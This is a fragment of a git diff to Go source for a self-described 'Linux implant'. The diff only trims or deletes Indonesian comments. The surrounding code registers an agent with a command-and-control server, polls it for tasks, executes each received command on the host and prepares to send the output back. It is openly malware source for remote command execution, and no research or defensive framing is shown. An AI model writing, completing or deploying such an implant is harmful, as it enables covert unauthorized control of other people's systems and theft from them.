@@ -19,7 +19,7 @@ agentID := fmt.Sprintf("agent-%d", time.Now().Unix())
 fmt.Printf("[+] Linux implant started on %s\n", hostname)
 fmt.Printf("[+] Agent ID: %s\n", agentID)
 
-// Register ke server
+// Register
 registerData := map[string]string{
 "id":       agentID,
 "hostname": hostname,
@@ -49,7 +49,6 @@ fmt.Println("[+] Registered to C2 server")
 fmt.Println("[+] Entering task loop...")
 
 for {
-// Minta task
 taskReq := map[string]string{"agent_id": agentID}
 taskJSON, _ := json.Marshal(taskReq)
 
@@ -79,7 +78,6 @@ if ok && cmd != nil && cmd != "" {
 cmdStr := cmd.(string)
 fmt.Printf("[+] Received task: %s\n", cmdStr)
 
-// Eksekusi command
 parts := strings.Fields(cmdStr)
 var out []byte
 var execErr error
@@ -97,7 +95,6 @@ output = execErr.Error()
 
 fmt.Printf("[+] Output:\n%s\n", output)
 
-// Kirim hasil ke server (opsional, nanti ditambah)
 resultData := map[string]string{
 "agent_id": agentID,
 "command":  cmdStr,
